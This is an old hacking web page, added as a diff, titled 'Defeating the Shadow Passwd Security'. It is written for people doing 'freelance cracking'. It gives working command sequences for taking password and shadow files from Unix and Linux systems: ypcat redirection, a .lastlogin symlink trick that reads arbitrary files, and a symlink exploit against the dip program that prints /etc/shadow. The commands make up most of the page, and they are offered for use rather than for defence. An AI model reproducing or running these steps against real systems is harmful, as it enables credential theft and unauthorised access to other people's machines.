@@ -1,0 +1,56 @@
+<HTML>
+<TITLE>Defeating Shadow Passwd Security</TITLE>
+<body bgcolor="#000000" text="#ADD8E6" link="#FFFF00" onLoad="window.status='Images and Code Copyright (C) 1997 GPF'; return true">
+<center>
+<h1>Defeating the Shadow Passwd Security</h1>
+</center>
+<p>
+<!B> This is by no means a complete or even good list of possible ways to
+get a copy of the shadow file, but it's some that work and are pretty handy
+to know if you do alot of freelance cracking.<BR>
+<BR>
+<UL>
+<LI>Unix including: <b>SunOS, SCO, System V</b>, and others of the like are sometimes
+vulnerable to ypcat. This is an old and well known trick but it works.. To use
+it simply type ypcat /etc/passwd with your capture option turned on, or use
+      <pre>ypcat /etc/passwd > ~/passwd </pre>
+and download the passwd file from your home dir.<BR>
+<BR>
+<LI>Unix including: <b>SCO, System V 3.2, ?</b>, could be vulnerable to a hole using the
+.lastlogin file. In your home directory if a ls -al shows the .lastlogin to be
+owned by auth or root or anyone with better security then you it's good :)<BR>
+To exploit:<pre>
+rm -f ~/.lastlogin
+ln -s ~/.lastlogin /etc/passwd</pre>
+Now logout and then back in so you create the link.<pre>
+cat .lastlogin > passwd
+rm -f ~/.lastlogin </pre>
+This hole could have several other uses as well, the fact that it allows you
+read access to most any file on the system is a nice gift.<BR>
+<BR>
+<LI>Linux including: <b>slackware</b>, ?, not only can the dip hole be used to 
+exploit root but it can also snag you the shadow file fairly easily. Why 
+you wouldn't use it to get to root and then just edit/download it I have 
+no clue but here it is anyways..<BR>
+To exploit:<pre>
+ln -s /etc/shadow /tmp/dummy.dip
+/sbin/dip -v /tmp/dummy.dip</pre> 
+Assuming dip is vulnerable this should type the shadow file for you and 
+of course it's not limited to just reading the shadow file..<BR>
+
+<P>If you know of other tricks, especially some that defeat linux shadow, and
+wish to share them
+<A HREF="mailto:cassidy@netrom.com">mail Cassidy..</A>
+</ul>
+<p>
+HTML-version by <i><a href="mailto:matic@bau2.uibk.ac.at">Markus Hübner</a>
+</i>
+<p>
+<center>
+<b>
+<a href="../hack.htm">Back to the Index</a>
+</b>
+</center>
+</body>
+</html>
+
